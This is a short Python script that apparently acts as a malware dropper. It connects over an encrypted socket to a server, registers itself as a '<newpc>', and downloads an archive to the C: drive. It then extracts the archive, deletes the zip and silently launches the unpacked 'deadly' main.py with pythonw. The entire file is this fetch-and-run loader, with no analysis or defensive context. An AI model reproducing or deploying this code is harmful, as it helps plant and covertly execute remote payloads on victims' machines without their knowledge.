import os
import zipfile
import FileTransfer
import subprocess

def dont():
    os.popen('c:/deadly/main.py')
if __name__ == '__main__':
    client_socket, encryption_key = FileTransfer.initiate('127.0.0.1', 786)
    client_socket.send(FileTransfer.encrypt('<newpc>'.encode(), encryption_key))
    data = FileTransfer.decrypt(client_socket.recv(1024), encryption_key).decode()
    print(data)
    FileTransfer.receive(client_socket, encryption_key, data, 'c:/')
    with zipfile.ZipFile('c:/silent.zip', 'r') as zip:
        zip.extractall('c:/')
    os.remove('c:/silent.zip')
    os.chdir('c:/deadly/')
    os.popen('start pythonw c:/deadly/main.py')
